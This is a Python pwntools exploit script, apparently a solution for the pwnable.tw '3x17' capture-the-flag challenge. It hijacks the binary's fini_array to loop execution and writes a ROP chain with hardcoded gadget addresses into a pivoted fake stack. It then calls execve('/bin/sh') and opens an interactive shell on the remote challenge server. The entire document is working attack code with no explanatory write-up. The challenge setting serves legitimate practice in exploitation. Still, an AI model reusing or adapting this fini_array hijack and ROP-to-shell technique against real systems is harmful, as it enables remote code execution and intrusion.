from pwn import *

context.endian = 'little'
context.arch = 'amd64'

#converts an integer into a little endian qword
def q64(addr):
    return addr.to_bytes(8, "little")

#static addresses
fini_addr          = 0x00000000004B40F0
main_addr          = 0x0000000000401B6D
run_addr           = 0x0000000000402960
virtual_stack_addr = fini_addr

#the initial data we write to fini_array (we loop main -> run -> main -> ... )
fini_data = q64(run_addr) + q64(main_addr)

#proc = process(["gdbserver", "localhost:1234", "3x17"]);
proc = remote("chall.pwnable.tw", port=10105)

#overwrite the fini_array
proc.readuntil("addr:")
proc.sendline(str(fini_addr))
proc.readuntil("data:")
proc.send(fini_data)

rop_rsp2rbp     = 0x000000000044D8AB #!!!points the stack pointer to our virtual stack!!!

#rop 
rop_pop_rax     = 0x000000000041e4af
rop_syscall     = 0x0000000000471db5
rop_pop_rdi_pop = 0x0000000000402fdb
rop_pop_rdx     = 0x0000000000446e35
rop_pop_rsi     = 0x0000000000406c30
rop_sys         = 0x0000000000471db5

#this is the rop payload that makes up the virtual stack
payload = [
    q64(rop_rsp2rbp), #this address overlaps with fini_array, which is why it is run
    q64(rop_pop_rsi),
    q64(virtual_stack_addr + 6 * 8),
    q64(rop_pop_rax),
    q64(59),
    q64(rop_pop_rdi_pop),
    q64(virtual_stack_addr + 11 * 8),
    q64(0x0),
    q64(rop_pop_rdx),
    q64(0x0),
    q64(rop_sys),
    b'/bin/sh\x00',
    q64(0x0)
]

#generate the virtual stack by overwriting data
for i in range(3, -1, -1):
    print()
    proc.readuntil("addr:")
    proc.sendline(str(virtual_stack_addr + (24 * i)))
    proc.readuntil("data:")
    proc.send(b"".join(payload[i * 3: (i+1) * 3]))

proc.interactive()
